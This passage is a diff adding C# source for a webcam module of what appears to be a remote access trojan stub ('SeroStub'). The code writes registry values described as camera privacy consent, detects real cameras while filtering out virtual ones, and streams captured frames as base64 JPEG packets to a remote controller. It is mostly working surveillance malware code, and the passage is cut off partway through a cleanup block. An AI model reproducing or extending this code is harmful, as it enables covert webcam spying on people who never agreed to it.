@@ -1,0 +1,980 @@
+using System;
+using System.Collections.Generic;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+namespace SeroStub;
+
+// DirectShow-only webcam capture using SampleGrabber graph.
+
+internal static class WebcamFeature
+{
+    // ── DirectShow GUIDs ──────────────────────────────────────────────────────
+
+    private static readonly Guid CLSID_SystemDeviceEnum    = new("62BE5D10-60EB-11D0-BD3B-00A0C911CE86");
+    private static readonly Guid IID_ICreateDevEnum        = new("29840822-5B84-11D0-BD3B-00A0C911CE86");
+    private static readonly Guid CLSID_VideoInputDeviceCat = new("860BB310-5D01-11D0-BD3B-00A0C911CE86");
+    private static readonly Guid IID_IPropertyBag          = new("55272A00-42CB-11CE-8135-00AA004BB851");
+
+    private static readonly Guid CLSID_FilterGraph          = new("E436EBB3-524F-11CE-9F53-0020AF0BA770");
+    private static readonly Guid CLSID_CaptureGraphBuilder2 = new("BF87B6E1-8C27-11D0-B3F0-00AA003761C5");
+    private static readonly Guid CLSID_SampleGrabber        = new("C1F400A0-3F08-11D3-9F0B-006008039E37");
+    private static readonly Guid CLSID_NullRenderer         = new("C1F400A4-3F08-11D3-9F0B-006008039E37");
+    private static readonly Guid IID_IGraphBuilder          = new("56A868A9-0AD4-11CE-B03A-0020AF0BA770");
+    private static readonly Guid IID_ICaptureGraphBuilder2  = new("93E5A4E0-2D50-11D2-ABFA-00A0C9C6E38D");
+    private static readonly Guid IID_IMediaControl          = new("56A868B1-0AD4-11CE-B03A-0020AF0BA770");
+    private static readonly Guid IID_IBaseFilter            = new("56A86895-0AD4-11CE-B03A-0020AF0BA770");
+    private static readonly Guid IID_ISampleGrabber         = new("6B652FFF-11FE-4FCE-92AD-0266B5D7C78F");
+    private static readonly Guid PIN_CATEGORY_CAPTURE       = new("FB6C4281-0353-11D1-905F-0000C0CC16BA");
+    private static readonly Guid MEDIATYPE_Video_DS         = new("73646976-0000-0010-8000-00AA00389B71");
+    private static readonly Guid MEDIASUBTYPE_RGB24         = new("E436EB7D-524F-11CE-9F53-0020AF0BA770");
+    private static readonly Guid MEDIASUBTYPE_YUY2          = new("32595559-0000-0010-8000-00AA00389B71");
+    private static readonly Guid FORMAT_VideoInfo           = new("05589F80-C356-11CE-BF01-00AA0055595A");
+    private static readonly Guid FORMAT_VideoInfo2          = new("F72A76A0-EB0A-11D0-ACE4-0000C0CC16BA");
+
+    private const int    S_OK       = 0;
+    private const uint   CLSCTX_INPROC = 1;
+
+    // ── P/Invoke ──────────────────────────────────────────────────────────────
+
+    [DllImport("ole32.dll")]
+    private static extern int CoCreateInstance(ref Guid rclsid, IntPtr pUnkOuter, uint dwClsContext,
+        ref Guid riid, out IntPtr ppv);
+    [DllImport("ole32.dll")]
+    private static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);
+    [DllImport("ole32.dll")]
+    private static extern int CreateBindCtx(uint reserved, out IntPtr ppbc);
+
+    [DllImport("gdiplus.dll")]
+    private static extern int GdipCreateBitmapFromScan0(int width, int height, int stride,
+        int format, IntPtr scan0, out IntPtr bitmap);
+    [DllImport("gdiplus.dll")]
+    private static extern int GdipDisposeImage(IntPtr image);
+
+    // ── Registry P/Invoke (camera privacy consent) ───────────────────────────
+
+    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
+    private static extern int RegCreateKeyExW(IntPtr hKey, string lpSubKey, uint Reserved,
+        IntPtr lpClass, uint dwOptions, uint samDesired, IntPtr lpSecurityAttributes,
+        out IntPtr phkResult, out uint lpdwDisposition);
+    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
+    private static extern int RegSetValueExW(IntPtr hKey, string lpValueName, uint Reserved,
+        uint dwType, byte[] lpData, uint cbData);
+    [DllImport("advapi32.dll")]
+    private static extern int RegCloseKey(IntPtr hKey);
+
+    private static readonly IntPtr HKEY_CURRENT_USER  = new IntPtr(unchecked((int)0x80000001));
+    private static readonly IntPtr HKEY_LOCAL_MACHINE = new IntPtr(unchecked((int)0x80000002));
+    private const uint KEY_SET_VALUE           = 0x0002;
+    private const uint REG_OPTION_NON_VOLATILE = 0;
+    private const uint REG_SZ                  = 1;
+
+    // ── COM struct & delegate types ───────────────────────────────────────────
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct AM_MEDIA_TYPE
+    {
+        public Guid  majortype;
+        public Guid  subtype;
+        public int   bFixedSizeSamples;
+        public int   bTemporalCompression;
+        public uint  lSampleSize;
+        public Guid  formattype;
+        public IntPtr pUnk;
+        public uint  cbFormat;
+        public IntPtr pbFormat;
+    }
+
+    [StructLayout(LayoutKind.Explicit, Size = 16)]
+    private struct VARIANT
+    {
+        [FieldOffset(0)] public ushort vt;
+        [FieldOffset(8)] public IntPtr val;
+    }
+    private const ushort VT_BSTR = 8;
+
+    private delegate int QI_Del(IntPtr pThis, ref Guid riid, out IntPtr ppv);
+    private delegate int SetFiltergraph_Del(IntPtr pThis, IntPtr pGraph);
+    private delegate int AddFilter_Del(IntPtr pThis, IntPtr pFilter,
+        [MarshalAs(UnmanagedType.LPWStr)] string pName);
+    private delegate int RenderStream_Del(IntPtr pThis, ref Guid pCategory, ref Guid pType,
+        IntPtr pSource, IntPtr pIntermediate, IntPtr pSink);
+    private delegate int SetOneShot_Del(IntPtr pThis, int bOneShot);
+    private delegate int SetMT_Del(IntPtr pThis, ref AM_MEDIA_TYPE pmt);
+    private delegate int GetConnectedMediaType_Del(IntPtr pThis, out AM_MEDIA_TYPE pmt);
+    private delegate int IMediaControl_Run_Del(IntPtr pThis);
+    private delegate int SetCallback_Del(IntPtr pThis, IntPtr pCallback, int which);
+    private delegate int CreateClassEnumerator_Del(IntPtr pThis, ref Guid cat, out IntPtr ppEnum, uint flags);
+    private delegate int IEnumMoniker_Next_Del(IntPtr pThis, uint celt, out IntPtr rgelt, out uint fetched);
+    private delegate int IMoniker_BindToStorage_Del(IntPtr pThis, IntPtr pbc, IntPtr left, ref Guid riid, out IntPtr ppv);
+    private delegate int IMoniker_BindToObject_Del(IntPtr pThis, IntPtr pbc, IntPtr pmkToLeft, ref Guid riid, out IntPtr ppvResult);
+    private delegate int IPropertyBag_Read_Del(IntPtr pThis,
+        [MarshalAs(UnmanagedType.LPWStr)] string name, ref VARIANT pVar, IntPtr pErrLog);
+    private delegate uint Release_Delegate(IntPtr pThis);
+
+    // ── State ─────────────────────────────────────────────────────────────────
+
+    private static volatile bool _running;
+    private static Thread? _thread;
+    private static Func<int, string, System.Threading.Tasks.Task>? _send;
+    private static WcamStartDataStub _cfg = new();
+
+    private static volatile int _pendingRequests;
+    private static readonly SemaphoreSlim _frameReqWake = new(0, 100);
+
+    private static volatile int _adaptiveQuality;
+    private static long         _lastFrameSendMs;
+
+    private static volatile byte[]? _sgCbFrame;
+    private static volatile int _cbFrameTotal;
+    static char[] _wcamB64Chars = new char[128 * 1024];  // grow-only base64 scratch
+    static readonly System.Text.StringBuilder _wcamSb = new(256 * 1024); // reused JSON builder
+
+    // Vtable/object allocated once at process start, never freed.
+    // DirectShow worker threads may call back after unregistration on some drivers;
+    // keeping these alive permanently prevents use-after-free → AccessViolationException.
+    private static readonly IntPtr s_cbVtbl;
+    private static readonly IntPtr s_cbObj;
+
+    static WebcamFeature()
+    {
+        var (vtbl, obj) = AllocSGCallbackObj();
+        s_cbVtbl = vtbl;
+        s_cbObj  = obj;
+    }
+
+    // ── Public API ────────────────────────────────────────────────────────────
+
+    // Keywords that identify known virtual/software cameras — filtered out of the Yes/No detection.
+    // EnumDirectShowDevices() is unchanged so the webcam window still lists them for capture.
+    private static readonly string[] s_virtualCamKeywords =
+    [
+        "virtual", "manycam", "xsplit", "snap camera", "droidcam",
+        "epoccam", "camo", "iriun", "ivcam", "lsv", "streamlabs",
+        "youcam", "chromecam", "ndi video", "e2esoft", "vcam",
+    ];
+
+    private static bool IsVirtualCamera(string name)
+    {
+        foreach (var kw in s_virtualCamKeywords)
+            if (name.Contains(kw, StringComparison.OrdinalIgnoreCase))
+                return true;
+        return false;
+    }
+
+    public static bool HasCamera()
+    {
+        try { return EnumDirectShowDevices().Any(d => !IsVirtualCamera(d.name)); }
+        catch { return false; }
+    }
+
+    public static void Start(WcamStartDataStub cfg, Func<int,string,System.Threading.Tasks.Task> send)
+    {
+        Stop();
+        _cfg     = cfg;
+        _send    = send;
+        _running = true;
+        _pendingRequests = 2;
+        _adaptiveQuality = cfg.Quality;
+        Interlocked.Exchange(ref _lastFrameSendMs, 0);
+        _thread  = new Thread(CaptureLoop) { IsBackground = true, Name = "WcamCapture" };
+        _thread.SetApartmentState(ApartmentState.STA);
+        _thread.Start();
+    }
+
+    public static void Stop()
+    {
+        _running = false;
+        WebcamDShow.Stop();
+        _frameReqWake.Release();
+        _thread?.Join(3000);
+        _thread = null;
+    }
+
+    public static void SignalAck()
+    {
+        long sentMs = Interlocked.Read(ref _lastFrameSendMs);
+        if (sentMs > 0)
+        {
+            int rtt = (int)Math.Min(Environment.TickCount64 - sentMs, 5000);
+            int q   = _adaptiveQuality;
+            if      (rtt > 450 && q > 15)            _adaptiveQuality = Math.Max(15,           q - 8);
+            else if (rtt < 100 && q < _cfg.Quality)  _adaptiveQuality = Math.Min(_cfg.Quality, q + 3);
+        }
+        Interlocked.Increment(ref _pendingRequests);
+        if (_frameReqWake.CurrentCount == 0)
+            _frameReqWake.Release();
+    }
+
+    // ── Capture loop ──────────────────────────────────────────────────────────
+
+    private static void CaptureLoop()
+    {
+        try
+        {
+            GrantCameraPrivacy();
+
+            var dsDevs = EnumDirectShowDevices();
+
+            if (_cfg.DeviceIndex < 0)
+            {
+                SendDeviceList(Array.ConvertAll(dsDevs, d => d.name));
+                return;
+            }
+
+            if (dsDevs.Length == 0) { SendError("No webcam device found."); return; }
+
+            if (_cfg.DeviceIndex >= dsDevs.Length)
+            { SendError($"Device index {_cfg.DeviceIndex} not found ({dsDevs.Length} device(s) available)."); return; }
+
+            int di = _cfg.DeviceIndex;
+            bool dsOk = TryDShowSampleGrabberCapture(di, dsDevs[di].symlink);
+            if (!dsOk && _running)
+            {
+                WebcamDShow.Start(dsDevs[di].symlink, di, _cfg.Quality, _cfg.Fps,
+                    _send!, _ => { }, msg => SendError(msg));
+            }
+        }
+        catch { }
+    }
+
+    // ── IUnknown helper ───────────────────────────────────────────────────────
+
+    private static void IUnknown_Release(IntPtr p)
+    {
+        if (p == IntPtr.Zero) return;
+        var fn = Marshal.GetDelegateForFunctionPointer<Release_Delegate>(
+            Marshal.ReadIntPtr(Marshal.ReadIntPtr(p), 2 * IntPtr.Size));
+        fn(p);
+    }
+
+    private static IntPtr ComQI(IntPtr p, Guid iid)
+    {
+        if (p == IntPtr.Zero) return IntPtr.Zero;
+        var fn = Marshal.GetDelegateForFunctionPointer<QI_Del>(
+            Marshal.ReadIntPtr(Marshal.ReadIntPtr(p), 0));
+        return fn(p, ref iid, out IntPtr ppv) == S_OK ? ppv : IntPtr.Zero;
+    }
+
+    // ── DirectShow device enumeration ─────────────────────────────────────────
+
+    private static (string name, string symlink)[] EnumDirectShowDevices()
+    {
+        var results = new List<(string, string)>();
+        IntPtr pDevEnum = IntPtr.Zero, pEnum = IntPtr.Zero, pbc = IntPtr.Zero;
+        try
+        {
+            CoInitializeEx(IntPtr.Zero, 2);
+            var clsid = CLSID_SystemDeviceEnum;
+            var iid   = IID_ICreateDevEnum;
+            if (CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_INPROC, ref iid, out pDevEnum) != S_OK)
+                return Array.Empty<(string, string)>();
+
+            var cat = CLSID_VideoInputDeviceCat;
+            var enumFn = Marshal.GetDelegateForFunctionPointer<CreateClassEnumerator_Del>(
+                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pDevEnum), 3 * IntPtr.Size));
+            if (enumFn(pDevEnum, ref cat, out pEnum, 0) != S_OK || pEnum == IntPtr.Zero)
+                return Array.Empty<(string, string)>();
+
+            CreateBindCtx(0, out pbc);
+            var nextFn = Marshal.GetDelegateForFunctionPointer<IEnumMoniker_Next_Del>(
+                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pEnum), 3 * IntPtr.Size));
+            var iidPB = IID_IPropertyBag;
+
+            while (true)
+            {
+                int hr = nextFn(pEnum, 1, out IntPtr pMoniker, out uint fetched);
+                if (hr != S_OK || fetched == 0 || pMoniker == IntPtr.Zero) break;
+                try
+                {
+                    var bindFn = Marshal.GetDelegateForFunctionPointer<IMoniker_BindToStorage_Del>(
+                        Marshal.ReadIntPtr(Marshal.ReadIntPtr(pMoniker), 9 * IntPtr.Size));
+                    if (bindFn(pMoniker, pbc, IntPtr.Zero, ref iidPB, out IntPtr pPB) == S_OK && pPB != IntPtr.Zero)
+                    {
+                        try
+                        {
+                            var readFn = Marshal.GetDelegateForFunctionPointer<IPropertyBag_Read_Del>(
+                                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pPB), 3 * IntPtr.Size));
+                            VARIANT vName = default, vLink = default;
+                            readFn(pPB, "FriendlyName", ref vName, IntPtr.Zero);
+                            readFn(pPB, "DevicePath",   ref vLink, IntPtr.Zero);
+                            string name = vName.vt == VT_BSTR && vName.val != IntPtr.Zero
+                                ? Marshal.PtrToStringBSTR(vName.val) ?? "" : "";
+                            string link = vLink.vt == VT_BSTR && vLink.val != IntPtr.Zero
+                                ? Marshal.PtrToStringBSTR(vLink.val) ?? "" : "";
+                            if (vName.val != IntPtr.Zero) Marshal.FreeBSTR(vName.val);
+                            if (vLink.val != IntPtr.Zero) Marshal.FreeBSTR(vLink.val);
+                            if (!string.IsNullOrEmpty(name))
+                                results.Add((name, link));
+                        }
+                        finally { IUnknown_Release(pPB); }
+                    }
+                }
+                finally { IUnknown_Release(pMoniker); }
+            }
+        }
+        catch { }
+        finally
+        {
+            if (pbc      != IntPtr.Zero) IUnknown_Release(pbc);
+            if (pEnum    != IntPtr.Zero) IUnknown_Release(pEnum);
+            if (pDevEnum != IntPtr.Zero) IUnknown_Release(pDevEnum);
+        }
+        return results.ToArray();
+    }
+
+    // Get IBaseFilter* for DS device at devIdx (for graph building)
+    private static IntPtr DSGetBaseFilter(int devIdx)
+    {
+        IntPtr pDevEnum = IntPtr.Zero, pEnum = IntPtr.Zero, pbc = IntPtr.Zero;
+        try
+        {
+            var clsid = CLSID_SystemDeviceEnum;
+            var iid   = IID_ICreateDevEnum;
+            if (CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_INPROC, ref iid, out pDevEnum) != S_OK)
+                return IntPtr.Zero;
+            var cat = CLSID_VideoInputDeviceCat;
+            var enumFn = Marshal.GetDelegateForFunctionPointer<CreateClassEnumerator_Del>(
+                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pDevEnum), 3 * IntPtr.Size));
+            if (enumFn(pDevEnum, ref cat, out pEnum, 0) != S_OK || pEnum == IntPtr.Zero)
+                return IntPtr.Zero;
+            CreateBindCtx(0, out pbc);
+            var nextFn = Marshal.GetDelegateForFunctionPointer<IEnumMoniker_Next_Del>(
+                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pEnum), 3 * IntPtr.Size));
+            int idx = 0;
+            while (true)
+            {
+                int hr = nextFn(pEnum, 1, out IntPtr pMoniker, out uint fetched);
+                if (hr != S_OK || fetched == 0 || pMoniker == IntPtr.Zero) break;
+                try
+                {
+                    if (idx == devIdx)
+                    {
+                        var bfIid  = IID_IBaseFilter;
+                        var bindFn = Marshal.GetDelegateForFunctionPointer<IMoniker_BindToObject_Del>(
+                            Marshal.ReadIntPtr(Marshal.ReadIntPtr(pMoniker), 8 * IntPtr.Size));
+                        int bindHr = bindFn(pMoniker, pbc, IntPtr.Zero, ref bfIid, out IntPtr ppBF);
+                        if (bindHr == S_OK && ppBF != IntPtr.Zero) return ppBF;
+                        return IntPtr.Zero;
+                    }
+                    idx++;
+                }
+                finally { IUnknown_Release(pMoniker); }
+            }
+        }
+        catch { }
+        finally
+        {
+            if (pbc      != IntPtr.Zero) IUnknown_Release(pbc);
+            if (pEnum    != IntPtr.Zero) IUnknown_Release(pEnum);
+            if (pDevEnum != IntPtr.Zero) IUnknown_Release(pDevEnum);
+        }
+        return IntPtr.Zero;
+    }
+
+    // ── ISampleGrabberCB callback (vtable-built COM object) ───────────────────
+
+    private static readonly Guid IID_ISampleGrabberCB =
+        new(0x0579154A, 0x2B53, 0x4994, 0xB0, 0xD0, 0xE7, 0x73, 0x14, 0x8E, 0xFF, 0x85);
+    private static readonly Guid IID_IUnknown =
+        new(0x00000000, 0x0000, 0x0000, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46);
+
+    [UnmanagedCallersOnly(CallConvs = new[] { typeof(CallConvStdcall) })]
+    private static unsafe int SgCb_QI(IntPtr pThis, Guid* riid, IntPtr* ppv)
+    {
+        if (ppv == null) return unchecked((int)0x80004003);
+        if (*riid == IID_IUnknown || *riid == IID_ISampleGrabberCB)
+        {
+            *ppv = pThis;
+            return 0;
+        }
+        *ppv = IntPtr.Zero;
+        return unchecked((int)0x80004002);
+    }
+
+    [UnmanagedCallersOnly(CallConvs = new[] { typeof(CallConvStdcall) })]
+    private static uint SgCb_AddRef(IntPtr p) => 1;
+
+    [UnmanagedCallersOnly(CallConvs = new[] { typeof(CallConvStdcall) })]
+    private static uint SgCb_Release(IntPtr p) => 0;
+
+    [UnmanagedCallersOnly(CallConvs = new[] { typeof(CallConvStdcall) })]
+    private static int SgCb_SampleCB(IntPtr p, double t, IntPtr pSample) => 0;
+
+    [UnmanagedCallersOnly(CallConvs = new[] { typeof(CallConvStdcall) })]
+    private static unsafe int SgCb_BufferCB(IntPtr p, double t, IntPtr pBuffer, int len)
+    {
+        if (pBuffer == IntPtr.Zero || len <= 0) return 0;
+        try
+        {
+            var b = System.Buffers.ArrayPool<byte>.Shared.Rent(len);
+            Marshal.Copy(pBuffer, b, 0, len);
+            var old = System.Threading.Interlocked.Exchange(ref _sgCbFrame, b);
+            if (old != null) System.Buffers.ArrayPool<byte>.Shared.Return(old);
+            System.Threading.Interlocked.Increment(ref _cbFrameTotal);
+        }
+        catch { }
+        return 0;
+    }
+
+    private static unsafe (IntPtr vtbl, IntPtr obj) AllocSGCallbackObj()
+    {
+        IntPtr vtbl = Marshal.AllocHGlobal(5 * IntPtr.Size);
+        Marshal.WriteIntPtr(vtbl, 0 * IntPtr.Size, (IntPtr)(delegate* unmanaged[Stdcall]<IntPtr, Guid*, IntPtr*, int>)&SgCb_QI);
+        Marshal.WriteIntPtr(vtbl, 1 * IntPtr.Size, (IntPtr)(delegate* unmanaged[Stdcall]<IntPtr, uint>)&SgCb_AddRef);
+        Marshal.WriteIntPtr(vtbl, 2 * IntPtr.Size, (IntPtr)(delegate* unmanaged[Stdcall]<IntPtr, uint>)&SgCb_Release);
+        Marshal.WriteIntPtr(vtbl, 3 * IntPtr.Size, (IntPtr)(delegate* unmanaged[Stdcall]<IntPtr, double, IntPtr, int>)&SgCb_SampleCB);
+        Marshal.WriteIntPtr(vtbl, 4 * IntPtr.Size, (IntPtr)(delegate* unmanaged[Stdcall]<IntPtr, double, IntPtr, int, int>)&SgCb_BufferCB);
+        IntPtr obj = Marshal.AllocHGlobal(IntPtr.Size);
+        Marshal.WriteIntPtr(obj, vtbl);
+        return (vtbl, obj);
+    }
+
+    // ── DirectShow SampleGrabber graph ────────────────────────────────────────
+
+    private static bool TryDShowSampleGrabberCapture(int devIdx, string symlink)
+    {
+        IntPtr pGraph = IntPtr.Zero, pBuilder = IntPtr.Zero;
+        IntPtr pCapFilt = IntPtr.Zero, pGrabFilt = IntPtr.Zero;
+        IntPtr pGrabIF = IntPtr.Zero, pNullRend = IntPtr.Zero;
+        IntPtr pMediaCtrl = IntPtr.Zero;
+        try
+        {
+            var clsid = CLSID_FilterGraph;
+            var iid   = IID_IGraphBuilder;
+            int hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_INPROC, ref iid, out pGraph);
+            if (hr != S_OK || pGraph == IntPtr.Zero) return false;
+
+            clsid = CLSID_CaptureGraphBuilder2;
+            iid   = IID_ICaptureGraphBuilder2;
+            hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_INPROC, ref iid, out pBuilder);
+            if (hr != S_OK || pBuilder == IntPtr.Zero) return false;
+
+            var setFgFn = Marshal.GetDelegateForFunctionPointer<SetFiltergraph_Del>(
+                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pBuilder), 3 * IntPtr.Size));
+            if (setFgFn(pBuilder, pGraph) != S_OK) return false;
+
+            var addFn = Marshal.GetDelegateForFunctionPointer<AddFilter_Del>(
+                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pGraph), 3 * IntPtr.Size));
+
+            pCapFilt = DSGetBaseFilter(devIdx);
+            if (pCapFilt == IntPtr.Zero) return false;
+            addFn(pGraph, pCapFilt, "Capture");
+
+            clsid = CLSID_SampleGrabber;
+            iid   = IID_IBaseFilter;
+            hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_INPROC, ref iid, out pGrabFilt);
+            if (hr != S_OK || pGrabFilt == IntPtr.Zero) return false;
+
+            pGrabIF = ComQI(pGrabFilt, IID_ISampleGrabber);
+            if (pGrabIF == IntPtr.Zero) return false;
+
+            var setMtFn = Marshal.GetDelegateForFunctionPointer<SetMT_Del>(
+                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pGrabIF), 4 * IntPtr.Size));
+            var setOsFn = Marshal.GetDelegateForFunctionPointer<SetOneShot_Del>(
+                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pGrabIF), 3 * IntPtr.Size));
+            setOsFn(pGrabIF, 0);
+            addFn(pGraph, pGrabFilt, "SG");
+
+            clsid = CLSID_NullRenderer;
+            iid   = IID_IBaseFilter;
+            hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_INPROC, ref iid, out pNullRend);
+            if (hr != S_OK || pNullRend == IntPtr.Zero) return false;
+            addFn(pGraph, pNullRend, "NR");
+
+            var cat   = PIN_CATEGORY_CAPTURE;
+            var mtype = MEDIATYPE_Video_DS;
+            var rsFn  = Marshal.GetDelegateForFunctionPointer<RenderStream_Del>(
+                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pBuilder), 7 * IntPtr.Size));
+
+            // Format negotiation: YUY2 → RGB24 → any
+            var mtYuy2 = new AM_MEDIA_TYPE { majortype = MEDIATYPE_Video_DS, subtype = MEDIASUBTYPE_YUY2 };
+            setMtFn(pGrabIF, ref mtYuy2);
+            hr = rsFn(pBuilder, ref cat, ref mtype, pCapFilt, pGrabFilt, pNullRend);
+            if (hr != S_OK)
+            {
+                var mtRgb = new AM_MEDIA_TYPE { majortype = MEDIATYPE_Video_DS, subtype = MEDIASUBTYPE_RGB24 };
+                setMtFn(pGrabIF, ref mtRgb);
+                hr = rsFn(pBuilder, ref cat, ref mtype, pCapFilt, pGrabFilt, pNullRend);
+                if (hr != S_OK)
+                {
+                    var mtAny = new AM_MEDIA_TYPE { majortype = MEDIATYPE_Video_DS };
+                    setMtFn(pGrabIF, ref mtAny);
+                    hr = rsFn(pBuilder, ref cat, ref mtype, pCapFilt, pGrabFilt, pNullRend);
+                    if (hr != S_OK) return false;
+                }
+            }
+
+            // Read connected media type for frame dimensions + format
+            int vidW = 640, vidH = 480, bpp = 3;
+            bool sgIsMjpg = false, sgIsYuy2 = false, vidBottomUp = false;
+            var getConnFn = Marshal.GetDelegateForFunctionPointer<GetConnectedMediaType_Del>(
+                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pGrabIF), 5 * IntPtr.Size));
+            if (getConnFn(pGrabIF, out AM_MEDIA_TYPE connMt) == S_OK
+                && connMt.pbFormat != IntPtr.Zero)
+            {
+                // VIH2 adds 24 bytes before BITMAPINFOHEADER; VIH1 has BITMAPINFOHEADER at offset 48.
+                int bihOff = connMt.formattype == FORMAT_VideoInfo2 ? 72 : 48;
+                if (connMt.cbFormat >= (uint)(bihOff + 20))
+                {
+                    vidW = Marshal.ReadInt32(connMt.pbFormat, bihOff + 4);
+                    int biHeight = Marshal.ReadInt32(connMt.pbFormat, bihOff + 8);
+                    vidBottomUp = biHeight > 0;
+                    vidH = Math.Abs(biHeight);
+                    short biBitCount = Marshal.ReadInt16(connMt.pbFormat, bihOff + 14);
+                    bpp = biBitCount >= 32 ? 4 : 3;
+                    uint biComp = (uint)Marshal.ReadInt32(connMt.pbFormat, bihOff + 16);
+                    sgIsMjpg = biComp == 0x47504A4D;
+                    sgIsYuy2 = biComp == 0x32595559;
+                    if (!sgIsMjpg && !sgIsYuy2 && biBitCount == 16)
+                    {
+                        if (connMt.pUnk != IntPtr.Zero) IUnknown_Release(connMt.pUnk);
+                        Marshal.FreeCoTaskMem(connMt.pbFormat);
+                        return false;
+                    }
+                }
+                if (connMt.pUnk != IntPtr.Zero) IUnknown_Release(connMt.pUnk);
+                Marshal.FreeCoTaskMem(connMt.pbFormat);
+            }
+            if (vidW <= 0) vidW = 640;
+            if (vidH <= 0) vidH = 480;
+
+            // Register ISampleGrabberCB callback (BufferCB) — use the permanent static object
+            _sgCbFrame = null;
+            {
+                var setCbFn = Marshal.GetDelegateForFunctionPointer<SetCallback_Del>(
+                    Marshal.ReadIntPtr(Marshal.ReadIntPtr(pGrabIF), 9 * IntPtr.Size));
+                setCbFn(pGrabIF, s_cbObj, 1); // 1 = BufferCB
+            }
+
+            // Run graph
+            pMediaCtrl = ComQI(pGraph, IID_IMediaControl);
+            if (pMediaCtrl == IntPtr.Zero) return false;
+            var runFn = Marshal.GetDelegateForFunctionPointer<IMediaControl_Run_Del>(
+                Marshal.ReadIntPtr(Marshal.ReadIntPtr(pMediaCtrl), 7 * IntPtr.Size));
+            runFn(pMediaCtrl);
+            Thread.Sleep(400);
+
+            RemoteDesktopFeature.EnsureGdiplusPublic();
+            int intervalMs  = Math.Max(1, 1000 / Math.Max(1, _cfg.Fps));
+            long lastSendMs = 0;
+
+            while (_running)
+            {
+                if (_pendingRequests <= 0)
+                {
+                    _frameReqWake.Wait(200);
+                    if (!_running) break;
+                    if (_pendingRequests <= 0) continue;
+                }
+                
+                try
+                {
+                    long now = Environment.TickCount64;
+                    long sleepMs = intervalMs - (now - lastSendMs);
+                    if (sleepMs > 5) Thread.Sleep((int)Math.Clamp(sleepMs, 5, intervalMs));
+                    now = Environment.TickCount64;
+                    if (now - lastSendMs < intervalMs) continue;
+
+                    byte[]? raw = System.Threading.Interlocked.Exchange(ref _sgCbFrame, null);
+                    if (raw == null) continue;
+
+                    byte[]? bgraBuffer = null;
+                    byte[]? jpeg = null;
+                    int jpegLen = 0;
+                    bool jpegIsRented = false;
+                    try
+                    {
+                        // Determine effective dimensions for this frame
+                        int outW = vidW, outH = vidH;
+                        int maxH = _cfg.MaxHeight;
+                        if (maxH > 0 && vidH > maxH)
+                        {
+                            outH = maxH;
+                            outW = (int)((double)vidW / vidH * maxH);
+                            if (outW < 1) outW = 1;
+                        }
+
+                        int encQ = _adaptiveQuality;
+                        if (outW != vidW || outH != vidH)
+                        {
+                            if (sgIsMjpg) { jpeg = ScaleMjpeg(raw, outW, outH, encQ, out jpegLen, out jpegIsRented); }
+                            else if (sgIsYuy2) { bgraBuffer = Yuy2ToBgra(raw, vidW, vidH, vidBottomUp); jpeg = ScaleAndEncode(bgraBuffer, vidW, vidH, outW, outH, encQ, out jpegLen); jpegIsRented = jpeg != null; }
+                            else if (bpp == 4) { bgraBuffer = Bgrx32ToBgra(raw, vidW, vidH); jpeg = ScaleAndEncode(bgraBuffer, vidW, vidH, outW, outH, encQ, out jpegLen); jpegIsRented = jpeg != null; }
+                            else { bgraBuffer = Rgb24ToBgra(raw, vidW, vidH); jpeg = ScaleAndEncode(bgraBuffer, vidW, vidH, outW, outH, encQ, out jpegLen); jpegIsRented = jpeg != null; }
+                        }
+                        else
+                        {
+                            if (sgIsMjpg) { jpeg = raw; jpegLen = raw.Length; }
+                            else if (sgIsYuy2) { jpeg = Yuy2ToJpeg(raw, vidW, vidH, encQ, vidBottomUp, out jpegLen); jpegIsRented = jpeg != null; }
+                            else if (bpp == 4)  { jpeg = Bgrx32ToJpeg(raw, vidW, vidH, encQ, out jpegLen); jpegIsRented = jpeg != null; }
+                            else                { jpeg = Rgb24ToJpeg(raw, vidW, vidH, encQ, out jpegLen); jpegIsRented = jpeg != null; }
+                        }
+
+                        if (jpeg == null || jpegLen == 0) continue;
+
+                        lastSendMs = now;
+                        Interlocked.Exchange(ref _lastFrameSendMs, now);
+                        int b64Need = (jpegLen + 2) / 3 * 4;
+                        if (_wcamB64Chars.Length < b64Need) _wcamB64Chars = new char[b64Need + 64];
+                        Convert.TryToBase64Chars(jpeg.AsSpan(0, jpegLen), _wcamB64Chars, out int b64Written);
+                        _wcamSb.Clear()
+                            .Append("{\"w\":").Append(outW)
+                            .Append(",\"h\":").Append(outH)
+                            .Append(",\"j\":\"").Append(_wcamB64Chars, 0, b64Written)
+                            .Append("\"}");
+                        var json = _wcamSb.ToString();
+
+                        Interlocked.Decrement(ref _pendingRequests);
+                        _send?.Invoke((int)PacketType.WcamFrame, json)
+                             .ContinueWith(_ => { }, System.Threading.Tasks.TaskContinuationOptions.None);
+                    }
+                    finally
+                    {
+                        if (jpegIsRented && jpeg != null) System.Buffers.ArrayPool<byte>.Shared.Return(jpeg);
+                        if (bgraBuffer != null) System.Buffers.ArrayPool<byte>.Shared.Return(bgraBuffer);
+                        System.Buffers.ArrayPool<byte>.Shared.Return(raw);
+                    }
+                }
+                catch { Thread.Sleep(intervalMs); }
+            }
+            return true;
+        }
+        catch { return false; }
+        finally
+        {
+            // Unregister callback BEFORE stopping graph — gives DirectShow worker threads
+            // a chance to drain before we release the filter graph COM objects.
+            if (pGrabIF != IntPtr.Zero)
+            {
